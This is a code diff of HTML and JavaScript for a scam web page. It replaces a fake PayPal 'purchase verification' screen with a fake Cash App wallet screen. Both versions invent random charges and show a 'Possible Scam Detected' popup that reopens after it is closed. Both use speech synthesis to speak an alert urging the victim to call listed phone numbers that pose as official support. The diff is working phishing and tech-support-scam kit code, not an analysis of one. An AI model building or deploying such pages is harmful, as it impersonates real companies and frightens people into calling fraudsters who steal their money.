-</div>
-
-<div
-id="ref2"
-style="
-font-size:22px;
-font-weight:700;
-margin-top:10px;
-">
-
-</div>
-
-<div
-class="small"
-style="margin-top:24px;">
-
-LAST UPDATED
-
-</div>
-
-<div
-id="date2"
-style="margin-top:10px;">
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<!-- =====================================
-     PURCHASE DETAILS GRID
-===================================== -->
-
-<div class="box">
-
-<style>
-
-.grid{
-
-display:grid;
-
-grid-template-columns:
-repeat(auto-fit,minmax(240px,1fr));
-
-gap:18px;
-
-}
-
-.grid-box{
-
-background:#f8fbff;
-
-border:1px solid #dbeafe;
-
-border-radius:24px;
-
-padding:22px;
-
-transition:.25s ease;
-
-}
-
-
-.grid-box:hover{
-
-transform:
-translateY(-3px);
-
-border-color:
-rgba(10,132,255,.25);
-
-}
-
-.grid-title{
-
-font-size:13px;
-
-color:#8e8e93;
-
-margin-bottom:10px;
-
-letter-spacing:.3px;
-
-}
-
-.grid-value{
-
-font-size:19px;
-
-font-weight:700;
-
-line-height:1.4;
-
-}
-
-</style>
-
-<div class="grid">
-
-<div class="grid-box">
-
-<div class="grid-title">
-Purchase Item
-</div>
-
-<div class="grid-value">
-Personal Payment
-</div>
-
-</div>
-
-<div class="grid-box">
-
-<div class="grid-title">
-Purchase Amount
-</div>
-
-<div
-class="grid-value"
-id="gridAmount">
-
-$200.00
-
-</div>
-
-</div>
-
-<div class="grid-box">
+    </div>
 
-<div class="grid-title">
-Verification Status
-</div>
-
-<div class="grid-value">
-
-<span style="color:#009cde;">
-Review Pending
-</span>
-
-</div>
-
-</div>
-
-<div class="grid-box">
-
-<div class="grid-title">
-Session Type
-</div>
-
-<div class="grid-value">
-Secure Checkout
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<!-- =====================================
-     RECENT ACTIVITY
-===================================== -->
-
-<div class="box">
-
-<style>
-
-.section-title{
-
-font-size:28px;
-
-font-weight:700;
-
-margin-bottom:24px;
-
-letter-spacing:-.6px;
-
-}
-
-.activity{
-
-display:flex;
-
-justify-content:space-between;
-align-items:center;
-
-padding:18px;
-
-border-radius:22px;
-
-background:#ffffff;
-
-border:1px solid #e5e7eb;
-
-margin-bottom:14px;
-
-transition:.2s ease;
-
-}
-
-.activity:hover{
-
-transform:
-translateY(-2px);
-
-}
-
-.activity-name{
-
-font-size:16px;
-
-font-weight:700;
-
-}
-
-.activity-sub{
-
-font-size:13px;
-
-margin-top:5px;
-
-color:#8e8e93;
-
-}
-
-.activity-amount{
-
-font-size:16px;
-
-font-weight:700;
-
-color:#003087;
-
-}
-
-</style>
-
-<div class="section-title">
-Recent Activity
-</div>
-
-<div id="activity">
-
-<!-- JS injects activities -->
-
-</div>
-
-</div>
-
-<!-- =====================================
-     NEED HELP SECTION
-===================================== -->
+    <!-- PIN SCREEN -->
 
-<div class="box">
+    <div class="pin-screen" id="pinScreen">
 
-<style>
+        <div class="pin-title">
+            Enter Passcode
+        </div>
 
-.help-wrap{
+        <div class="pin-dots">
 
-display:flex;
+            <div class="dot" id="d1"></div>
+            <div class="dot" id="d2"></div>
+            <div class="dot" id="d3"></div>
+            <div class="dot" id="d4"></div>
 
-justify-content:space-between;
-align-items:center;
+        </div>
 
-flex-wrap:wrap;
+    </div>
 
-gap:20px;
+    <!-- MAIN -->
 
-}
+    <div class="main" id="main">
 
-.help-title{
+        <!-- STATUS -->
 
-font-size:30px;
+        <div class="status">
+            <div id="liveTime"></div>
+            <div>5G 🔋</div>
+        </div>
 
-font-weight:800;
+        <!-- TOPBAR -->
 
-letter-spacing:-1px;
+        <div class="topbar">
 
-}
+            <div class="logo">
+                <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+            </div>
 
-.help-sub{
+            <div class="profile">👤</div>
 
-margin-top:10px;
+        </div>
 
-font-size:15px;
+        <!-- HEADER -->
 
-line-height:1.8;
+        <div class="header">
 
-color:#8e8e93;
+            <div class="mini-chart">
 
-max-width:560px;
+                <div class="chart-top">
 
-}
+                    <div>
 
-.support-btn{
+                        <div class="chart-balance">
+                            $12,840
+                        </div>
 
-padding:16px 28px;
+                        <div class="chart-growth">
+                            +12.4% This Week
+                        </div>
 
-border:none;
+                    </div>
 
-border-radius:18px;
+                    <div class="chart-pill">
+                        LIVE
+                    </div>
 
-font-size:15px;
-font-weight:700;
+                </div>
 
-cursor:pointer;
+                <svg viewBox="0 0 300 120" class="chart-svg">
 
-background:
-linear-gradient(
-180deg,
-#0a84ff,
-#0066ff
-);
+                    <path
+                    d="M0 90 
+                       C30 70, 50 80, 70 60
+                       C90 40, 120 50, 140 35
+                       C170 10, 210 30, 240 20
+                       C260 15, 280 25, 300 5"
 
-color:#fff;
+                    fill="none"
+                    stroke="#00d64f"
+                    stroke-width="5"
+                    stroke-linecap="round"/>
 
-box-shadow:
-0 12px 30px rgba(0,122,255,.25);
+                </svg>
 
-transition:.25s ease;
+            </div>
 
-}
+        </div>
 
-.support-btn:hover{
+        <!-- CTA -->
 
-transform:
-translateY(-2px);
+        <div class="cta">
 
-}
+            <div class="cta-title">
+                Need Assistance?
+            </div>
 
-</style>
+            <div class="cta-sub">
+                Contact our transfer support line for instant account help.
+            </div>
 
-<div class="help-wrap">
+            <a href="tel:18058247959" class="cta-btn">
+                📞 +1 (805) 824-7959
+            </a>
 
-<div>
+        </div>
 
-<div class="help-title">
-Need Help?
-</div>
-
-<div class="help-sub">
-
-Contact our purchase verification
-specialists at
-1 (803) 238-4071 for assistance
-regarding this digital transaction,
-account review, or verification
-status.
-
-</div>
-
-</div>
-
-<button
-class="support-btn"
-onclick="callSupport()">
-
-Contact Support
-
-</button>
-
-</div>
-
-</div>
-
-<!-- =====================================
-     PayPal SUPPORT PANEL
-===================================== -->
-
-<div class="box">
-
-<style>
-
-.support-card{
-
-display:flex;
-
-justify-content:space-between;
-align-items:center;
-
-gap:20px;
-
-flex-wrap:wrap;
-
-}
-
-.support-left{
-
-display:flex;
-
-align-items:center;
-
-gap:16px;
-
-}
-
-.phone-icon{
-
-width:54px;
-height:54px;
-
-border-radius:50%;
-
-display:flex;
+        <!-- ACTIVITY -->
 
-justify-content:center;
-align-items:center;
+        <div class="section">
 
-background:
-rgba(10,132,255,.12);
+            <div class="section-head">
 
-}
+                <div class="section-title">
+                    Recent Activity
+                </div>
 
-.support-main{
+                <div class="see-all">
+                    See all
+                </div>
 
-font-size:16px;
+            </div>
 
-font-weight:700;
+            <div class="activity-card">
 
-}
+                <!-- ITEM -->
 
-.support-sub{
+                <div class="item">
 
-margin-top:6px;
+                    <div class="item-left">
 
-font-size:13px;
+                        <div class="icon black">
+                            ₿
+                        </div>
 
-color:#8e8e93;
+                        <div>
 
-}
+                            <div class="name">
+                                Bitcoin Purchase
+                            </div>
 
-.call-now{
+                            <div class="time">
+                                Today • 9:18 AM
+                            </div>
 
-padding:14px 22px;
+                        </div>
 
-border-radius:16px;
+                    </div>
 
-border:none;
+                    <div class="amount minus">
+                        -$620
+                    </div>
 
-cursor:pointer;
+                </div>
+				
 
-font-weight:700;
+                <!-- ITEM -->
 
-background:#009cde;
+                <div class="item">
 
-color:#fff;
+                    <div class="item-left">
 
-}
+                        <div class="icon green">
+                            ↓
+                        </div>
 
-</style>
+                        <div>
 
-<div class="support-card">
+                            <div class="name">
+                                Cash Deposit
+                            </div>
 
-<div class="support-left">
+                            <div class="time">
+                                Today • 11:42 AM
+                            </div>
 
-<div class="phone-icon">
+                        </div>
 
-📞
+                    </div>
 
-</div>
-
-<div>
-
-<div class="support-main">
-
-Didn't recognize this purchase?
-
-</div>
-
-<div class="support-sub">
-
-Call PayPal Purchase Support
-• 24/7 Assistance
-
-</div>
-
-</div>
-
-</div>
-
-<button
-class="call-now"
-onclick="callSupport()">
-
-Call Now
+                    <div class="amount plus">
+                        +$2,400
+                    </div>
 
-</button>
+                </div>
 
-</div>
-
-</div>
-
-<!-- =====================================
-     FOOTER
-===================================== -->
-
-<div class="footer">
-
-<style>
-
-.footer{
-
-padding:30px 10px 80px;
 
-text-align:center;
 
-}
+                <!-- ITEM -->
 
-.footer-links{
+                <div class="item">
 
-display:flex;
+                    <div class="item-left">
 
-justify-content:center;
+                        <div class="icon soft">
+                            ↑
+                        </div>
 
-gap:14px;
+                        <div>
 
-flex-wrap:wrap;
+                            <div class="name">
+                                Transfer Sent
+                            </div>
 
-margin-bottom:16px;
+                            <div class="time">
+                                Yesterday • 7:24 PM
+                            </div>
 
-font-size:13px;
+                        </div>
 
-color:#8e8e93;
+                    </div>
 
-}
+                    <div class="amount minus">
+                        -$185
+                    </div>
 
-.footer-copy{
+                </div>
 
-font-size:12px;
+                <!-- ITEM -->
 
-color:#636366;
+                <div class="item">
 
-line-height:1.8;
+                    <div class="item-left">
 
-}
+                        <div class="icon green">
+                            $
+                        </div>
 
-@media(max-width:768px){
+                        <div>
 
-.activity{
+                            <div class="name">
+                                Payment Received
+                            </div>
 
-flex-direction:column;
-align-items:flex-start;
+                            <div class="time">
+                                Yesterday • 1:02 PM
+                            </div>
 
-gap:10px;
+                        </div>
 
-}
+                    </div>
 
-.help-wrap{
+                    <div class="amount plus">
+                        +$850
+                    </div>
 
-flex-direction:column;
-align-items:flex-start;
+                </div>
 
-}
+            </div>
 
-.support-btn,
-.call-now{
+        </div>
 
-width:100%;
+        
+    </div>
 
-}
+<!-- NAV -->
 
-.support-card{
+        <div class="nav">
 
-flex-direction:column;
-align-items:flex-start;
+            <div class="nav-item">
+                <div class="nav-icon">🏠</div>
+            </div>
 
-}
+            <div class="nav-item active">
+                <div class="nav-icon">$</div>
+            </div>
 
-}
+            <div class="nav-item">
+                <div class="nav-icon">↗</div>
+            </div>
 
-</style>
+            <div class="nav-item">
+                <div class="nav-icon">🕗</div>
+            </div>
 
-<div class="footer-links">
+        </div>
+		
+		
+<!-- TRANSACTION POPUP -->
 
-<span>Terms of Use</span>
+<div class="popup-wrap" id="popupWrap">
 
-<span>•</span>
+    <div class="popup-card">
 
-<span>Privacy Policy</span>
+        <div class="popup-badge">
+            Possible Scam Detected
+        </div>
 
-<span>•</span>
+        <div class="popup-amount" id="popupAmount">
+            -$185
+        </div>
 
-<span>Billing & Refunds</span>
+        <div class="popup-user">
+            BTC Sent to Alex Morgan
+        </div>
 
-<span>•</span>
+        <div class="popup-time" id="popupTime">
+            Today • 2:41 PM
+        </div>
 
-<span>Support</span>
+        <button class="popup-btn" onclick="closePopup()">
+            View Transaction
+        </button>
 
-</div>
-
-<div class="footer-copy">
-
-© 2026 PayPal Inc. All rights reserved.
-
-<br><br>
+        <a href="tel:18058247959" class="popup-support">
+            📞 Contact Support
+        </a>
 
-PayPal Pay and PayPal Services are
-trademarks of PayPal Inc.
+    </div>
 
 </div>
 
 </div>
-
-<!-- CLOSE PAGE2 -->
-</div>
-
-<!-- CLOSE APP CONTAINER -->
-</div>
-
-<!-- =====================================
-     JAVASCRIPT ENGINE
-===================================== -->
 
 <script>
 
-/* =====================================
-   GENERATORS
-===================================== */
-
-function randomRef(){
-
-return (
-"TXN-" +
-Math.random()
-.toString(36)
-.substring(2,6)
-.toUpperCase() +
-
-"-" +
-
-Math.random()
-.toString(36)
-.substring(2,6)
-.toUpperCase()
-
-);
-
-}
-
-function formatDate(){
-
-const d = new Date();
-
-return d.toLocaleString(
-'en-US',
-{
-year:'numeric',
-month:'short',
-day:'2-digit',
-hour:'2-digit',
-minute:'2-digit',
-second:'2-digit'
-}
-);
-
-}
-
-function generateAmount(){
-
-return Math.floor(
-Math.random()*601
-)+200;
-
-}
-
-/* =====================================
-   GLOBAL DATA
-===================================== */
-
-let purchaseRef = randomRef();
-
-let purchaseDate = formatDate();
-
-let purchaseAmount = generateAmount();
-
-/* =====================================
-   COUNT UP ANIMATION
-===================================== */
-
-function animateAmount(
-element,
-target
-){
-
-let start = 0;
-
-let duration = 1800;
-
-let increment =
-target /
-(duration/16);
-
-const timer =
-setInterval(()=>{
-
-start += increment;
-
-if(start >= target){
-
-start = target;
-
-clearInterval(timer);
-
-}
-
-element.innerText =
-"$" +
-Math.floor(start);
-
-},16);
-
-}
-
-/* =====================================
-   ACTIVITY FEED
-===================================== */
-
-function buildActivities(){
-
-const items = [
-
-"Digital Store",
-"Gift Card Activation",
-"Purchase Verification",
-"Media Purchase",
-"Digital Delivery",
-"Wallet Authorization"
-
-];
-
-let html = '';
-
-items.forEach(item=>{
-
-const value =
-(
-Math.random()*120
-+
-20
-).toFixed(2);
-
-html += `
-
-<div class="activity">
-
-<div>
-
-<div class="activity-name">
-
-${item}
-
-</div>
-
-<div class="activity-sub">
-
-Secure Digital Processing
-
-</div>
-
-</div>
-
-<div class="activity-amount">
-
-$${value}
-
-</div>
-
-</div>
-
-`;
-
-});
-
-document
-.getElementById("activity")
-.innerHTML = html;
-
-}
-
-/* =====================================
-   POPULATE PAGE
-===================================== */
-
-function populateData(){
-
-/* modal amount */
-
-document
-.getElementById("modalAmount")
-.innerText =
-"$" +
-purchaseAmount;
-
-/* face amount */
-
-document
-.getElementById("faceAmount")
-.innerText =
-"$" +
-purchaseAmount;
-
-/* dashboard amount */
-
-document
-.getElementById("amt")
-.innerText =
-"$0";
-
-animateAmount(
-document.getElementById("amt"),
-purchaseAmount
-);
-
-/* grid amount */
-
-document
-.getElementById("gridAmount")
-.innerText =
-"$" +
-purchaseAmount +
-".00";
-
-/* references */
-
-document
-.getElementById("ref")
-.innerText =
-purchaseRef;
-
-document
-.getElementById("ref2")
-.innerText =
-purchaseRef;
-
-/* dates */
-
-document
-.getElementById("date")
-.innerText =
-purchaseDate;
-
-document
-.getElementById("date2")
-.innerText =
-purchaseDate;
-
-/* info card */
-
-document
-.getElementById("purchaseInfo")
-.innerHTML =
-
-`
-
-<div>
-
-<b>ITEM:</b>
-
-In-app Crypto Purchase
-
-</div>
-
-<div>
-
-<b>VALUE:</b>
-
-$${purchaseAmount}.00
-
-</div>
-
-
-
-<div>
-
-<b>REFERENCE:</b>
-
-<span id="ref">
-
-${purchaseRef}
-
-</span>
-
-</div>
-
-
-<div>
-
-<b>DEVICE:</b>
-
-Secure Browser Session NJ
-
-</div>
-
-`;
-
-buildActivities();
-
-}
-
-/* =====================================
-   Secure Wallet Verification FLOW
-===================================== */
-
-function startFaceID(){
-
-document
-.getElementById("faceIdOverlay")
-.classList
-.remove("hidden");
-
-}
-
-/* =====================================
-   SUCCESS FLASH
-===================================== */
-
-function triggerFlash(){
-
-const flash =
-document.getElementById(
-"flashLayer"
-);
-
-flash.style.animation =
-"none";
-
-void flash.offsetWidth;
-
-flash.style.animation =
-"flashEffect .35s ease-out forwards";
-
-}
-
-/* =====================================
-   SHOW MODAL
-===================================== */
-
-
-
-/* =====================================
-   OPEN FULL DETAILS
-===================================== */
-
-function openFull(){
-
-document
-.getElementById("modal")
-.classList
-.add("hidden");
-
-document
-.getElementById("page2")
-.classList
-.remove("hidden");
-
-/* reopen popup after 4 sec */
+/* LOADING TEXT */
 
 setTimeout(()=>{
 
-document
-.getElementById("modal")
-.classList
-.remove("hidden");
-
-},4000);
-
-}
-
-/* =====================================
-   SUPPORT
-===================================== */
-
-function callSupport(){
-
-window.location.href =
-"tel:18032384071";
-
-}
-
-/* =====================================
-   VOICE ALERT
-===================================== */
-
-function playVerificationAlert(){
-
-if(!('speechSynthesis' in window)){
-return;
-}
-
-/* stop previous speech */
-
-window.speechSynthesis.cancel();
-
-/* number from support button */
-
-const supportNumber =
-"+1 844 376 7271";
-
-const message =
-
-`You have an autodebit alert from PayPal. If it's not you, please contact PayPal customer service immediately on ${supportNumber}`;
-
-const speech =
-new SpeechSynthesisUtterance(message);
-
-/* voice settings */
-
-speech.rate = 0.88;
-speech.pitch = 1.08;
-speech.volume = 1;
-
-/* try to use a natural English voice */
-
-const voices =
-window.speechSynthesis.getVoices();
-
-const preferred =
-voices.find(v =>
-v.lang.startsWith('en')
-);
-
-if(preferred){
-speech.voice = preferred;
-}
-
-window.speechSynthesis.speak(speech);
-
-}
-
-/* =====================================
-   LOADING SEQUENCE
-===================================== */
-function animateProgress(){
-
-let width = 0;
-
-const bar =
-document.getElementById(
-"progressBar"
-);
-
-const timer =
-setInterval(()=>{
-
-width += 10;
-
-if(width >= 100){
-
-width = 100;
-
-clearInterval(timer);
-
-}
-
-if(bar){
-bar.style.width =
-width + "%";
-}
-
-},250);
-
-}
-
-
-
-window.addEventListener(
-"DOMContentLoaded",
-()=>{
-
-populateData();
-
-/* 1 */
-
-setTimeout(()=>{
-
-document
-.getElementById("status")
-.innerText =
-"Signing you in...";
+    document.getElementById("loadingText").innerText =
+    "Securing Wallet...";
 
 },1500);
 
-/* 2 */
-
 setTimeout(()=>{
 
-document
-.getElementById("status")
-.innerText =
-"Loading account details...";
+    document.getElementById("loadingText").innerText =
+    "Loading Activity...";
 
 },3000);
 
-/* 3 */
+/* SPLASH TO PIN */
 
 setTimeout(()=>{
 
-document
-.getElementById("start")
-.style.display =
-"none";
+    document.getElementById("splash").style.opacity="0";
 
-startFaceID();
-animateProgress();
+    setTimeout(()=>{
 
-},4000);
+        document.getElementById("splash").style.display="none";
 
-/* 4 */
+        const pin =
+        document.getElementById("pinScreen");
 
-setTimeout(()=>{
+        pin.style.opacity="1";
+        pin.style.pointerEvents="all";
 
-triggerFlash();
+    },500);
 
-},6900);
+},4200);
 
-/* 5 */
+/* AUTO PIN */
 
 setTimeout(()=>{
 
-/* hide Secure Wallet Verification */
+    document.getElementById("d1").classList.add("active");
 
-document
-.getElementById("faceIdOverlay")
-.classList
-.add("hidden");
-
-/* show entire app */
-
-document
-.getElementById("appContainer")
-.style.opacity =
-"1";
-
-/* show header */
-
-document
-.getElementById("header")
-.classList
-.remove("hidden");
-
-/* IMPORTANT:
-   show dashboard first
-*/
-
-document
-.getElementById("page2")
-.classList
-.remove("hidden");
-
-/* show popup after dashboard is visible */
+},5200);
 
 setTimeout(()=>{
 
-document
-.getElementById("modal")
-.classList
-.remove("hidden");
+    document.getElementById("d2").classList.add("active");
 
-document
-.getElementById("modal")
-.style.display =
-"flex";
-
-/* voice notification */
+},5600);
 
 setTimeout(()=>{
-playVerificationAlert();
-},600);
 
-},3500);
+    document.getElementById("d3").classList.add("active");
 
-},7200);
+},6000);
 
-});
+setTimeout(()=>{
+
+    document.getElementById("d4").classList.add("active");
+
+},6400);
+
+/* OPEN MAIN */
+
+setTimeout(()=>{
+
+    const pin =
+    document.getElementById("pinScreen");
+
+    pin.style.opacity="0";
+
+    setTimeout(()=>{
+
+        pin.style.display="none";
+
+        document
+		.getElementById("main")
+		.classList.add("show");
+		
+		document.querySelector(".nav").style.display = "flex";
+
+    },500);
+
+},7600);
+
+/* =========================
+   LIVE TIME
+========================= */
+
+function updatePopupTime(){
+
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
+
+    document.getElementById("popupTime").innerText =
+    "Today • " + time;
+
+}
+
+updatePopupTime();
+
+/* =========================
+   RANDOM AMOUNT
+========================= */
+
+const randomAmount =
+Math.floor(Math.random() * 400) + 80;
+
+document.getElementById("popupAmount").innerText =
+"-$" + randomAmount;
+
+/* =========================
+   SHOW POPUP
+========================= */
+
+setTimeout(()=>{
+
+    document
+    .getElementById("popupWrap")
+    .classList.add("show");
+
+    setTimeout(()=>{
+
+        playVerificationAlert();
+
+    },600);
+
+},9800);
+
+/* =========================
+   CLOSE
+========================= */
+
+function closePopup(){
+
+    const popup =
+    document.getElementById("popupWrap");
+
+    popup.classList.remove("show");
+
+    /* subtle chart animation */
+
+    const chart =
+    document.querySelector(".mini-chart");
+
+    chart.style.transform =
+    "scale(.98)";
+
+    chart.style.transition =
+    ".3s ease";
+
+    setTimeout(()=>{
+
+        chart.style.transform =
+        "scale(1)";
+
+    },300);
+
+    /* reopen popup */
+
+    setTimeout(()=>{
+
+        popup.classList.add("show");
+
+    },2500);
+
+}
+
+/* =========================
+   VOICE ALERT
+========================= */
+
+function playVerificationAlert(){
+
+    if(!('speechSynthesis' in window)){
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+
+    const supportNumber =
+    "1 805 824 7959";
+
+    const message =
+
+    `Crypto transfer alert via Cash App Wallet. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+
+    const speech =
+    new SpeechSynthesisUtterance(message);
+
+    speech.rate = 0.9;
+    speech.pitch = 1;
+    speech.volume = 1;
+
+    const voices =
+    window.speechSynthesis.getVoices();
+
+    const preferred =
+    voices.find(v =>
+        v.lang.startsWith('en')
+    );
+
+    if(preferred){
+        speech.voice = preferred;
+    }
+
+    window.speechSynthesis.speak(speech);
+
+}
+
+/* =========================
+   LIVE STATUS TIME
+========================= */
+
+function updateLiveTime(){
+
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
+
+    document.getElementById("liveTime").innerText =
+    time;
+
+}
+
+updateLiveTime();
+
+setInterval(updateLiveTime,1000);
 
 </script>
-
-</div>
 
 </body>
 </html>
